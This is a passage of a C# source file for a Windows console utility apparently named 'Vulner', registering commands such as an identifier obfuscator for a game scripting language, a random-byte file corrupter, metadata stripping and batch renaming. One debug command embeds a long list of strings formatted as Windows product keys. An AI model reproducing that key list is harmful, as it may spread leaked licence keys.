using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Security.Principal;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Web;
using System.Management;
using System.Drawing;
using System.Globalization;
using Microsoft.Win32.SafeHandles;
using IWshRuntimeLibrary;
using System.Media;
using System.Data;
using NCalc;

namespace Vulner
{
    class Commands
    {
        public TerminalController t = null;
        public Main m = null;
        public object Error(string s, params string[] a)
        {
            string v = s;
            if (!v.EndsWith(".")) v += '.';
            t.ColorWrite("$c{0}", string.Format(v, a));
            return null;
        }
        public object Error(Exception e)
        {
            return Error("{0}\n{1}", e.Message, e.StackTrace);
        }
        public Dictionary<string, Command> Get(Main m, TerminalController t)
        {
            this.t = t;
            this.m = m;
            /*
            Func<string, object> Error = (s) =>
            {
                string v = s;
                if (!v.EndsWith(".")) v += '.';
                t.ColorWrite("$c{0}", v);
                return null;
            };*/
            Dictionary<string, Command> C = new Dictionary<string, Command>();

            /*
             * Standard colors:
             * Info: 8
             * Warning: E
             * Sucess: A
             * Error: C
             */
            bool __debug__ = false;
#if (DEBUG)
            __debug__ = true;
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    return null;
                },
            }.Save(C, new string[] { "example" }, __debug__);
            #endregion
            #region Todo Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    t.ColorWrite("$cTHINGS TO DO:\n");
                    foreach (KeyValuePair<string, Command> c in m.Cmds)
                    {
                        if (c.Key.Length == 0) { continue; }
                        if (c.Value.Debug) { continue; }
                        List<string> s = new List<string>();
                        if (Equals(c.Value.Help, null))
                        {
                            s.Add("Make help");
                        }
                        else
                        {
                            if (Equals(c.Value.Help.Description, null)) s.Add("Make help description");
                            if (Equals(c.Value.Help.Examples, null) && Equals(c.Value.Help.Usage, null)) s.Add("Make examples or usage");
                        }

                        if (s.Count > 0)
                        {
                            t.ColorWrite("$a{0}", c.Value.Name.ToUpper());
                            foreach (string str in s) { t.ColorWrite("$e {0}", str); }
                            t.WriteLine();
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "todo" }, __debug__);
            #endregion
            #region Invs Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    char[] ch = Funcs.InvisibleChars();
                    List<char> c = new List<char>();
                    foreach (char cha in ch)
                    {
                        t.WriteLine("Use this one: A{0}B?", cha);
                        if (t.ReadLine().ToLower().StartsWith("y"))
                        {
                            c.Add(cha);
                        }
                    }
                    t.WriteLine(string.Join("|", c.Select(b => b.ToString()).ToArray()));
                    return null;
                },
            }.Save(C, new string[] { "invs" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string h = @"
DW6BY-8DVYG-M38WF-FM8HQ-8RFTB
H3PBV-FHB27-RJTGH-X9YDC-JDDH6
XTRXD-K3H9T-4CK86-38BJG-JDW7W
B8T7K-67M97-2YMKD-67J3G-MJ6R6
BHFRD-H9FD4-D3PFQ-7GW4P-9KHBW
DQTYY-7BFDD-X2B2W-X2JJW-KP33Y
V22CM-2M3KJ-VY2H2-8GB74-K48KQ
WGJ2H-QD94T-67HWJ-2CJF3-3289T
JYJDJ-R7B2K-RJBHW-6W8WC-Q2W4J
W8HJJ-8C6XR-9DR2Y-K38KP-G2DGQ
BXP73-YFQ9Q-TJK64-73RBJ-2Q8CG
J47PT-GDT8X-YX7RD-48HKY-MK768
VKGC2-DQ2QX-C3MGT-336P2-VC44M
CMXQ7-M3HM2-2J6F6-QC8HM-X822M
BMF6R-CDJTV-V7YYT-WVT8P-DFTC6
HVD4T-4J86W-VQ9YC-3D8DR-DJ9QG
KKKYF-FK76B-BHCC6-VX2RC-PQ3QB
MMYG8-WXBMX-FHQPM-FRT2X-H6TY8
WFFV6-TCTTJ-BFJKC-CV4Q9-4WRCW
TPQPG-J6KJ2-JCX8V-KBXMP-XQGPQ
HCD3C-BWWCV-F92RM-Y2KWG-3MR6Q
PG3TH-YCRQD-T9Q2C-7KV26-YKKQB
JRDRG-3BVWD-GBG49-TH3CJ-YX4TW
JK3WW-XJHFV-9H47R-FK68X-GHQGG
R8MGB-3VG42-VRC8M-6G8PK-XC78B
D4JC6-FGJV7-BWJDG-FGF28-P86P3
W4PB7-2QVD7-HBDFR-RYGGD-389VY
BDJXP-BH7BT-RKY7B-JF3D6-29D88
QDBDK-DBXBW-74M8K-Q46J6-DRV96
JBF7Q-J3JKK-WJ429-W8Y3J-7H3JY
BVMTY-DD3GM-WCX6Y-6B2JC-M8R3B
THG4M-2TWCC-8D6Q7-97WHJ-YHXWJ
CY4JC-9VMHJ-TR6CP-PK9HQ-FTXR6
WM2XQ-HMVT3-77GQT-GTX4J-86TTJ
FQYWR-YJBXV-Y3XGD-8DD38-HTKDT
RGD7Y-TDYD7-9CP7R-B9M9P-GV8RY
W72JV-F99WQ-6JKHJ-RT38Q-RQH3T
B44HM-7PD4Q-C4CC9-TFY7M-2Q6PT
RMGB8-6MVW9-TQ6QQ-Q6J4Y-HWFMW
B9M4P-7PY3X-MMTKQ-VT33H-QBT4G
FJ972-3PCTC-CR76R-VPG6G-PJ9YY
V283T-JQCCQ-PT7T9-X3CHY-8WVXG
FF6P3-WXFTV-743G9-T9QJJ-6M4WJ
MVPW2-X9TWH-YHQMD-XK798-F6XFD
TMTVD-6G74G-TBTCK-RHVRB-P8GXW
B8RRK-446HW-9F67D-JX8J8-3MXXD
PQDHX-P8HYV-DM3CJ-CXG8R-G4WG6
PCF6M-CKF7R-HYWGX-HPD2W-WP89D
T2JWW-B3WMR-3KK3J-7WQK3-38BBJ
JDF2H-9632Y-YCFRY-DMG3F-6DHMQ
P49CV-TMJ39-DPJBM-JTCV8-8QRJG
C2MM7-P4488-BYXRH-CDF8K-W7CCM
MH34B-7H7DW-4Y2VQ-78P46-HJ766
MBMYW-TFFRB-4TJKT-7JJWV-9672T
FMHH4-26R34-BRXBH-JBWTB-4FGFG
FCYBR-8GYP2-JGVXF-843KC-7FRV3
PKWVF-TK664-P6D9G-QRTWD-9W47T
TGHK8-7BMW3-6V89T-FD3TC-9Q3GB
FGJW4-4G94V-PVRJ8-MW8Y6-32VWT
B4P6H-CX3M2-2KK9W-WB6WF-BMGDJ
HHK8F-7329C-X7V6M-RFWPX-67HXY
QGCH8-3F2WY-V3BYR-8W7H2-9FJQ8
HCRTP-M3968-F4BM8-YFP29-68PCB
FYC88-GMMQM-GRCGD-J6RPH-WTBCJ
HMGWV-D8TRX-DTFRB-8MH4Q-W9M6Q
VVV3F-FXH7G-2HT7J-G4FJC-9XB28
K4KGH-9B777-T74TT-VRJH2-KDB3Y
VHHWQ-KK73B-DWQK4-4BH66-KD8QT
JJX3F-6QV7F-DDJ3H-3VH4B-FKKPT
B4BFK-J7VGQ-7DY96-F27M9-7G6YG
WT74K-MW33W-VT8B7-BHHCQ-XVQWM
WT8TK-WHQMX-JCJVD-KG8D9-4D7Y3
HYV86-DY92B-MMJV3-MR4KX-7Q9BT
XH9YK-T7VJD-23JJ9-CKWVT-2QKJ6
Q7DQ7-YQ24T-KQVW7-3YPXQ-YQRCB
WFP4X-QXBH7-646TC-DPG67-JWDMD
PC2CR-TCPBM-WY648-XVCWV-43438
GD6GV-T6GGW-QGTXF-99TV3-R3FFG
K3KFR-49TPH-BCYQH-MMFCQ-GWMTT
M8PWM-BRGTX-3GRTH-WJTFK-6R7RJ
BJ4F4-XXBXY-Y83Q7-7J744-BWQFQ
VQFQ6-97JHT-9DJRV-XD2YQ-DC77J
DCCYB-W32VD-BGCMM-D4TK4-F4GWM
DPHQ8-BCCFF-47F96-3FXX6-2BCWY
CDWVX-FV674-3G2XW-7C6K2-GGPXY
HPPD9-HKRR3-XDJX9-HC9M3-GH6K6
WW8XM-TT7VY-W7D9F-CBHV4-YXPVB
W2F8Q-DKCB6-GMGFW-3WDXC-VPRJ6
FPTHR-GHKTP-6RRKY-DWV63-H8T66
DG6VR-PQR3F-6PWPP-3R944-W24VJ
DTCYK-T2XW2-G2JY6-K9PT2-VMKCM
JHKTQ-XT7X9-Y2G4B-7GKKW-X4TFT
XCRBY-QRWFC-KW3YK-8FQ6Y-KBPV3
RFGF7-J6TYH-XVC7K-C82QQ-XJPD3
PMYRK-FBM8T-BTBKB-MGQK8-6G97D
V286D-2VRTM-24G2J-Q6PXD-P233G
K4GXD-XY83H-DQMKP-9K233-4JKRY
K7PKQ-HHRK2-88WXM-76T7C-PYCFT
RQ7W7-YV47C-MWHGH-VWRJJ-C4GYG
RC8Q4-V7MYY-VHJPJ-MX7GJ-C266D
BMXCJ-4DGDT-PJBH8-H3Y63-CJJFT
BW96C-T3W72-KQRHF-TXWTF-B87CW
QGWD4-G74KP-FKTRV-VJ333-DFCRG
TK9GT-PBP6D-DWXWG-3G3MP-T43GD
HB9HY-7X82H-PQHKM-2YP9G-C844T
CRGJ8-FGT84-XRQMT-BW88R-V6XJ3
M6F3B-2GB7H-MQPWB-Q46CH-KFRVT
PYJBW-GR4MQ-4JDD3-4GWCF-XR46B
H2KK7-CBD2W-BP4BQ-HK9MH-TG4RQ
GKKJ6-VYTK6-3H7FY-GWYR9-P8H28
DFXWK-T4T29-T8QCC-8XGJK-PWTR8
GWY9W-99WCM-VBR2Y-8RGCC-CMWBQ
MCGC4-XVFKX-J7JTF-8VDF7-8HQWQ
J2C3Q-V3Q7G-D89J7-VWX8X-FQKYY
Q6XGY-HB789-76PMB-CQHC2-F6FW6
VYDDH-9M3K3-27PP7-6X9GB-QPFRW
PCCPP-96YHV-FY344-W8XMV-7VH2Y
RV72G-2QHM8-X9DHT-H36WX-WC3K6
DT9GD-CGCQG-V3CKP-73732-4JRPJ
R4FJW-6PG36-6VR92-9YPYF-YDW28
RW386-XGBWW-PCT4Y-33K3K-47FGG
KR2WG-KVJHY-FMMBT-94WHQ-3Q4GM
F479C-Q299Y-HQTJG-PC83Y-8RGB3
P467Q-H8HXM-7T92Q-33CG9-8T3HW
BD949-QWM9R-PQJ2J-4GGHF-9FD7T
CHXV7-49YYQ-YMMQG-6VVMG-6MP2D
HGP6K-H2G7P-2FBWP-YQ9XY-TQBY6
V293Y-QXMKR-R8CYR-DGH8W-TRB7B
GT4PM-2VFRK-M23WT-P6JQV-CJ37M
WKFV9-YQJGH-K6CCD-Y4CJK-XCGRQ
JDGVP-BC8CD-JH8WM-XD2Q4-CQ3DW
KT2GJ-4F99Y-JW6D3-JRGCC-DG4C3
Q2VK6-3D84H-VGDVP-MBMH2-XHKRM
PXXXC-RYG99-7JHHY-TD6CK-PGJ43
V4J6V-QQPB9-4C3P2-J94HG-48RWQ
QHPPM-38KC6-J3Y28-RFJ76-79K7D
M6X2K-PRXMC-DQF34-9VHMR-KMYTQ
G874F-YJ69M-C2XBY-MXG38-6RM8Y
WMPYK-C7624-76VPX-CGRGK-YHQFD
FKQKV-FK8PX-QG6JW-7DHYR-CMKFT
VRK49-24R7F-4WXMC-6YQ68-6FDYJ
TKGTP-WPXR3-7QRD2-4YFBB-VMM7B
JK6BW-4P2XW-W4KJD-K9R67-437FY
Q4HTC-DYW64-69CW7-X6BCQ-QXDW3
TQCH6-28H62-RQ2W3-Y823G-CDPHY
QHBJJ-JDVDW-K8D8P-QVQH3-DWXTG
HXF4X-X8QDQ-H4CJW-DDFFM-V3MB6
G3T8Q-GKXQ4-29RPK-Y3JKG-7J6XQ
B4JHY-G249M-8YFHR-GP9QF-27PYM
MHKR2-9K7BY-7X82H-3DQPT-2KMQQ
M6GK9-V6TJ7-JYFH4-6Q4VM-496MD
FHT87-GXCMT-FVK4M-FWVKQ-B8X2D
HR6MR-M2MYM-TKKX3-FPGVF-XJ4C8
PVR34-YHX24-J6YVV-TWKFH-MV42Q
TRCMM-89XVK-Y94MT-BYDVR-3FR3J
FQ3WJ-6HJF7-GHQ6T-TGGMY-KB4GT
JQKRX-27CDR-T8W3T-KG2QW-8KXMM
XP3VC-VBCJR-7QKQ2-KD2Q4-FC3Y8
PKW3J-4KVXY-XQVVT-R77WJ-QFF7W
B8RYC-WQ4JM-7YHCY-BYDDH-7PPGW
JVM66-Q8BHJ-YTF7C-JHRVM-YK438
TD3G7-MGGK8-KQW7M-6TTCP-Q797M
WJGC3-BXF8M-Y47H4-GG7HH-JYT23
BV4FC-KHG6Y-2DV88-P2BH7-99B3D
QG6V8-K63WT-D4GB4-FF7QH-Q3HTQ
HK99T-XVDD2-MXY8G-B6Q9P-X89BG
VPW2W-3MYRX-KBBXK-9D6JH-KY8D6
DDPYV-7JYHP-7KHR6-WCGVF-4GDKW
FRCKF-X8H6J-K8DR2-DYTQ7-CTJCJ
DKYBG-VYDW7-XVTDV-72TT7-RTDT6
TYMH3-7C9VD-7T3V2-9WVX6-K8YPM
KQPR3-DGXXC-GKWGW-8W94V-GPPKW
KWT97-9H2XB-TYRWB-8HBVJ-49R9Y
WKDKY-RTQKW-7VH44-6B2BQ-RKBTT
WPT9F-RVVQ2-82MQF-R2JPP-3JWCJ
V34JB-MGQ3D-BJ9VJ-WC927-JBTR6
C3F2R-HXY7F-M7FG4-T8M9R-G8TBM
DQYFV-WPDP3-93JR2-GBQ8M-P9CCY
K7JCX-QW4WM-X6G37-MHT36-3H3JT
GW7JP-HM4X8-CTCCH-MW8RH-9FGHW
WBT7G-RVBQQ-73443-Y6XGT-8KY3D
JTYC3-VMJM9-GFGQG-Q6YGP-9TKMM
V7M7D-B8KTK-KDTM6-4K62B-M8Y6Q
MDR4W-RCDC3-RGXPY-KJDYR-J94HJ
W9WHB-FPGVB-JYG8V-QPFY3-644F3
GHMDV-3CBR3-94769-KTM3B-Y8G7W
KJFDK-4JP3K-Y9KJJ-BM39R-64Y7M";
                    char[] ig = Util.Array('-', ' ', '\n');
                    HashSet<char> c = new HashSet<char>();
                    foreach (char p in h)
                    {
                        if (!ig.Contains(p))
                            c.Add(p);
                    }
                    t.ColorWrite("$a{0}", string.Join("", c.OrderBy(u => (int)u).ToArray().Select(o => o.ToString()).ToArray()));
                    return null;
                },
            }.Save(C, new string[] { "wkch" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    foreach (string s in Registry.ClassesRoot.GetSubKeyNames().Where(o => o.StartsWith(".")))
                    {
                        t.WriteLine(s);
                        new FileInfo(Path.Combine(Environment.CurrentDirectory, s)).Create().Close();
                    }
                    return null;
                },
            }.Save(C, new string[] { "no" }, __debug__);
            #endregion
            #region TS Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string s = "";
                    Action<string, object> add = (e, o) =>
                    {
                        s += string.Format(e.ToString(), o.ToString()) + "\n";
                    };
                    add("Stream is Null: {0}", Equals(t.stream, null));
                    add("StreamWriter is Null: {0}", Equals(t.r, null));
                    add("Buffer is: {0}", Equals(t.buffer, null));
                    add("Hide is: {0}", Equals(t.hide, null));
                    t.WriteLine("TerminalController is working");
                    MessageBox.Show(s, m.Name);
                    return null;
                },
            }.Save(C, new string[] { "ts" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string[] str = Registry.ClassesRoot.GetSubKeyNames().Where(o => !o.Contains(".")).ToArray();
                    foreach (string s in str)
                    {
                        try
                        {
                            RegistryKey cl = Registry.ClassesRoot.OpenSubKey(s + "\\shell\\Open\\command");
                            string v = cl.GetValue("").ToString();
                            if (v.Contains("%1") && v.IndexOf("%1") < 2)
                            {
                                t.WriteLine("{0} = {1}", s, v);
                            }
                        }
                        catch (Exception) { }
                    }
                    return null;
                },
            }.Save(C, new string[] { "exe" }, __debug__);
            #endregion
            #region Indent Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    FileInfo f = new FileInfo(a.Get(1));
                    FileInfo o = new FileInfo(Path.Combine(f.Directory.FullName, f.Name.Substring(0, f.Name.Length - f.Extension.Length) + "_indented" + f.Extension));
                    string[] s = System.IO.File.ReadAllLines(f.FullName)
                        .Select(b => b.Trim())
                        .Where(b => b != string.Empty)
                        .ToArray();
                    List<string> r = new List<string>();
                    bool header = true;
                    int indent = 0;

                    foreach (string str in s)
                    {
                        if (str.StartsWith("@") && header)
                        {
                            r.Add(str);
                            continue;
                        }
                        else if (header)
                        {
                            r.Add("");
                            header = false;
                        }
                        string res = "";
                        res += "".PadLeft(indent, '\t');
                        int i = -1;
                        Action nl = () =>
                        {
                            res += '\n' + "".PadLeft(indent, '\t');
                        };
                        Func<char, bool> IsNext = (c) =>
                        {
                            try
                            {
                                return str[i + 1] == c;
                            }
                            catch (Exception) { }
                            return false;
                        };
                        Func<char, bool> Islast = (c) =>
                        {
                            try
                            {
                                return str[i - 1] == c;
                            }
                            catch (Exception) { }
                            return false;
                        };
                        bool skpo = false;
                        foreach (char c in str)
                        {
                            i++;
                            if (skpo) { skpo = false; continue; }
                            if (c == '{')
                            {
                                nl();
                                res += c;
                                indent += 1;
                                if (!IsNext('\n'))
                                {
                                    nl();
                                }
                            }
                            else if (c == '}')
                            {
                                indent -= 1;
                                nl();
                                res += c;
                                if (!IsNext('\n'))
                                {
                                    nl();
                                }
                            }
                            else if (c == '(' && IsNext(')'))
                            {
                                res += c;
                            }
                            else if (c == '(')
                            {
                                res += c + " ";
                            }
                            else if (c == ')')
                            {
                                res += " " + c;
                            }
                            else if ("><=".Contains(c))
                            {
                                if (IsNext('='))
                                {
                                    res += string.Format(" {0}= ", c);
                                    skpo = true; continue;
                                }
                                res += string.Format(" {0} ", c);
                            }
                            else if ("/^*+-%~$".Contains(c) && (!IsNext(c) && !Islast(c)))
                            {
                                res += string.Format(" {0} ", c);
                            }
                            else if (",".Contains(c))
                            {
                                res += string.Format("{0} ", c);
                            }
                            else
                            {
                                res += c;
                            }
                        }

                        r = r.Concat(res.Split('\n')).ToList();
                    }

                    List<string> Final = new List<string>();
                    bool nln = false;
                    int k = -1;
                    Func<char, bool> Next = (c) =>
                    {
                        try
                        {
                            return r[k + 1].Trim()[0] == c;
                        }
                        catch (Exception) { }
                        return false;
                    };
                    foreach (string str in r)
                    {
                        k++;
                        string trim = str.Trim('\t');
                        if ((trim == string.Empty || trim == "{") && !nln)
                        {
                            nln = true;
                            Final.Add(str);
                            continue;
                        }
                        if (trim == string.Empty && nln)
                        {
                            continue;
                        }
                        Final.Add(str
                            .Replace("  ", " ")
                            .Replace("( )", "()")
                        );
                        nln = false;
                    }

                    System.IO.File.WriteAllLines(o.FullName, Final.ToArray());
                    return null;
                },
            }.Save(C, new string[] { "indent" }, __debug__);
            #endregion
            #region Obf Command
            string[] Obf_Ignore = new string[]
            {
                "if",
                "elseif",
                "else",
                "for",
                "foreach",
                "function",
                "while"
            };
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string alp = "ABCDEFGHIJKLMNOP";
                    string blp = "ABCDEFGHIJKLMNOPabcdefghijklmnop_";

                    FileInfo f = new FileInfo(a.Get(1));
                    FileInfo o = new FileInfo(Path.Combine(f.Directory.FullName, f.Name.Substring(0, f.Name.Length - f.Extension.Length) + "_indented" + f.Extension));

                    string s = System.IO.File.ReadAllText(f.FullName);

                    Dictionary<string, string> dc = new Dictionary<string, string>();

                    foreach (Match mt in Regex.Matches(s, "[^\\(a-zA-Z0-9:][^,a-zA-Z0-9:][,\r\n]?\\s*([a-z][a-zA-Z]+)\\s*\\([^\\)]+\\)[^:]"))
                    {
                        string vl = mt.Groups[1].Value;
                        if (Obf_Ignore.Contains(vl.ToLower())) continue;
                        dc[vl] = alp[Funcs.Rnd(0, alp.Length)] + Funcs.RandomString(blp, 12);
                    }
                    List<string> rp = new List<string>();
                    List<string> sv = new List<string>();
                    string fname = "f" + Funcs.RandomString(12);
                    foreach (KeyValuePair<string, string> k in dc)
                    {
                        s = new Regex(string.Format("{0}\\(", Regex.Escape(k.Key))).Replace(s, string.Format(" {0}(", k.Value));
                        t.WriteLine("{0} = {1}", k.Key, k.Value);
                        rp.Add(k.Value);
                        sv.Add(k.Key);
                    }
                    t.WriteLine();

                    string bf = string.Format("function {0}({1})", fname, string.Join(", ", rp.Select(b => b + ":string").ToArray())) + "{";
                    string[] r = s.Split('\n')
                        .Select(b => b.Trim())
                        .Where(b => b != string.Empty && !b.StartsWith("#"))
                        .ToArray();
                    Dictionary<string, string> Vars = new Dictionary<string, string>();
                    foreach (string str in r)
                    {
                        if (str.StartsWith("@persist "))
                        {
                            foreach (Match mt in Regex.Matches(str, "\\s([A-Z][^\\s]+)"))
                            {
                                Vars[mt.Groups[1].Value] = alp[Funcs.Rnd(0, alp.Length)] + Funcs.RandomString(blp, 12);
                                t.WriteLine("{0} = {1}", mt.Groups[1].Value, Vars[mt.Groups[1].Value]);
                            }
                        }
                        else
                        {
                            Match ma = Regex.Match(str, "([A-Z][^=\\s])[\\s]*=");
                            if (ma.Success)
                            {
                                Vars[ma.Groups[1].Value] = alp[Funcs.Rnd(0, alp.Length)] + Funcs.RandomString(blp, 12);
                                t.WriteLine("{0} = {1}", ma.Groups[1].Value, Vars[ma.Groups[1].Value]);
                            }
                        }
                    }
                    List<string> nr = new List<string>();

                    foreach (string str in r)
                    {
                        string result = str;
                        foreach (KeyValuePair<string, string> k in Vars)
                        {
                            result = new Regex(string.Format("([^a-zA-Z0-9\"])({0})([^a-zA-Z0-9\"])", Regex.Escape(k.Key.Trim()))).Replace(result, string.Format("$1{0}$3", k.Value));
                            result = new Regex(string.Format("^({0})([^a-zA-Z0-9\"])", Regex.Escape(k.Key.Trim()))).Replace(result, string.Format("{0}$2", k.Value));
                            result = new Regex(string.Format("([^a-zA-Z0-9\"])({0})$", Regex.Escape(k.Key.Trim()))).Replace(result, string.Format("$1{0}", k.Value));
                        }
                        nr.Add(result.Replace("! ", "!"));
                    }

                    List<string> res = new List<string>();

                    bool header = true;
                    foreach (string str in nr)
                    {
                        if (!str.StartsWith("@") && header)
                        {
                            res.Add(bf);
                            header = false;
                        }
                        res.Add(str);
                    }
                    if (header)
                    {
                        res.Add(bf);
                    }
                    res.Add("}");
                    res.Add(string.Format("{1}({0})",
                        string.Join(", ", sv.Select(b => string.Format("\"{0}\"", b)).ToArray()),
                        fname
                    ));

                    System.IO.File.WriteAllLines(o.FullName, res.ToArray());
                    return null;
                },
            }.Save(C, new string[] { "obf" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string[] to = a.Get(1).Split('-');
                    int l = int.Parse(a.Get(2));
                    int pad = int.Parse(a.Get(3));
                    if (to.Length != 2) return null;
                    int f = int.Parse(Regex.Match(to[0], "([0-9]+)").Groups[1].Value);
                    int s = int.Parse(Regex.Match(to[1], "([0-9]+)").Groups[1].Value);
                    string v = new Regex("[0-9]+").Replace(to[0], "{0}");

                    Func<int, string> form = ((i) =>
                    {
                        return string.Format(v, (i).ToString().PadLeft(pad, '0'));
                    });
                    int k = 0;
                    for (int i = f; i < s + 1; i++)
                    {
                        try
                        {
                            System.IO.File.Move(form(i), form(l + k));
                            t.WriteLine("{0} => {1}", form(i), form(l + k));
                            k++;
                        }
                        catch (Exception)
                        {
                            t.WriteLine("{0} => ", form(i));
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "rnmb" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string[] b = new string[] { "|___", "__|_" };
                    t.SetForeColor('f');
                    t.Write("".PadRight(Console.BufferWidth, '_'));
                    for (int i = 0; i < 10; i++)
                    {
                        string c = b[i % b.Length];
                        string r = "";
                        for (int k = 0; k < (Console.BufferWidth / c.Length) + 1; k++)
                        {
                            r += c;
                        }
                        r = r.Substring(0, Console.BufferWidth);
                        t.Write(r);
                    }
                    return null;
                },
            }.Save(C, new string[] { "wall" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string s = @"F:\pdf\aluguel.php";//a.Get(1);
                    FileInfo f = new FileInfo(s);
                    string d = System.IO.File.ReadAllText(f.FullName);
                    int time = Environment.TickCount;
                    Dictionary<string, int> count = new Dictionary<string, int>();
                    for (int i = 10; i < 30; i++)
                    {
                        for (int k = 0; k < d.Length - i; k += i)
                        {
                            string o = d.Substring(k, i);
                            for (int v = 0; v < d.Length - i; v += i)
                            {
                                string c = d.Substring(v, i);
                                if (c == o)
                                {
                                    if (!count.ContainsKey(c)) count[c] = 0;
                                    count[c]++;
                                }
                            }
                        }
                    }
                    t.WriteLine("Done in {0}ms", Environment.TickCount - time);
                    int total = 0;

                    count = count.Where(b => b.Value > 4).ToDictionary(x => x.Key, x => x.Value);
                    foreach (KeyValuePair<string, int> c in count)
                    {
                        total += c.Key.Length * c.Value;
                    }
                    t.WriteLine("Bytes detected: {0}", total);
                    t.WriteLine("Total: {0}", d.Length);

                    string h = "";
                    int l = 1;

                    d = d.Replace("\x12", "\x12\x12");

                    foreach (KeyValuePair<string, int> c in count)
                    {
                        if (d.Contains(c.Key))
                        {
                            h += c.Key + "\n";
                            d = d.Replace(c.Key, "\x12" + ((char)l++));
                        }
                    }
                    h += "\n\n";
                    h += d;
                    System.IO.File.WriteAllText("F:/pdf/test.txt", h);
                    return null;
                },
            }.Save(C, new string[] { "pt" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    int c = 1000;
                    string[] s = new string[c];
                    int i = 0;
                    int len = 0;
                    for (int v = 0; v < c; v++)
                    {
                        int k = v;
                        s[k] = "";
                        //int k = a.Int(1);
                        List<int> l = new List<int>();
                        while (!l.Contains(k))
                        {
                            l.Add(k);
                            string str = HumanFriendlyInteger.IntegerToWritten(k);
                            k = str.Length * 45;
                            s[v] += string.Format("{0} = {1}\n", str, k);
                        }
                        if (s[v].Split('\n').Length > len)
                        {
                            len = s[v].Split('\n').Length;
                            i = v;
                        }
                    }
                    t.SetForeColor('e');
                    t.WriteLine(s[i]);
                    return null;
                },
            }.Save(C, new string[] { "nbs" }, __debug__);
            #endregion
            #region DM Command (Data Mashing)
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    foreach (string s in Funcs.GetFilesSmarty(a.Get(1), false) )
                    {
                        FileInfo f = new FileInfo( Path.Combine( Environment.CurrentDirectory, s ) );
                        if (!f.Exists) continue;
                        byte[] bt = System.IO.File.ReadAllBytes(f.FullName);
                        List<byte> bb = new List<byte>();
                        int skip = 0;
                        int l = bt.Length;
                        int g = 0;
                        for ( int i = 0; i < bt.Length; i++ )
                        {
                            skip--;
                            byte cur = bt[i];
                            if (Funcs.Rnd(0, 500) < 10 && i > (l / 50) && skip < -( l / 10 ))
                            {
                                skip = (int)(l * 0.001);
                                g++;
                            }
                            if (skip > 0) {
                                bb.Add((byte)Funcs.Rnd(0, 256));
                                continue;
                            }
                            /*
                            if (Funcs.Rnd(0, 500) < 25 && skip < -(l / 10) && i > (l / 50))
                            {
                                Funcs.RandomBytes(5, 50).Each(o => bb.Add(o));
                                continue;
                            }*/
                            bb.Add(cur);
                        }
                        t.WriteLine("Groups: {0}", g);
                        System.IO.File.WriteAllBytes(f.FullName, bb.ToArray());
                    }
                    return null;
                },
            }.Save(C, new string[] { "dm" }, __debug__);
            #endregion
            #region RM Command ( Remove Metadata )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Removes file metadata",
                    Usage = Util.Array("{NAME} [file...]"),
                },
                Main = (Argumenter a) =>
                {
                    string[] args = a.VarArgs();
                    foreach (string s in args)
                    {
                        FileInfo f = null;
                        FileInfo tf = Funcs.TempFile();
                        Stream st = null;
                        Stream nf = null;
                        try
                        {
                            f = new FileInfo(Path.Combine(Environment.CurrentDirectory, s));
                            f.CopyTo(tf.FullName);
                            f.Attributes = 0;
                            f.Delete();
                            st = tf.OpenRead();
                            byte[] buffer = new byte[1024];
                            int r = 1024;
                            int o = 0;
                            nf = f.Create();
                            while (r != 0)
                            {
                                try
                                {
                                    r = st.Read(buffer, 0, buffer.Length);
                                    nf.Write(buffer, 0, buffer.Length);
                                }
                                catch (Exception)
                                {
                                    r = st.Read(buffer, 0, (int)(st.Length - o));
                                    nf.Write(buffer, 0, buffer.Length);
                                }
                                o += r;
                            }
                            t.ColorWrite("$aRemoved metadata from: $f{0}", f.Name);
                        }
                        catch (Exception) { }
                        if (st != null) st.Close();
                        if (nf != null) nf.Close();
                        if (tf.Exists) tf.Delete();
                    }
                    return null;
                },
            }.Save(C, new string[] { "rm" }, __debug__);
            #endregion
            #region Example Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string s = a.RawString().Replace(" ", "    ");
                    s = Regex.Replace(s, "([a-z])", ":regional_indicator_$1: ", RegexOptions.IgnoreCase).ToLower();
                    t.WriteLine(s);
                    return s;
                },
            }.Save(C, new string[] { "bl" }, __debug__);
            #endregion
            __debug__ = false;
#endif

            #region Vulner Commands
            #region Ver Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Prints current version",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    t.ColorWrite("$fCurrent version: $a{0}", m.Version);
                    return null;
                },
            }.Save(C, new string[] { "ver", "version" }, __debug__);
            #endregion
            #region Args Command
            new Command
            {
                AllSP = true,
                Help = new CommandHelp
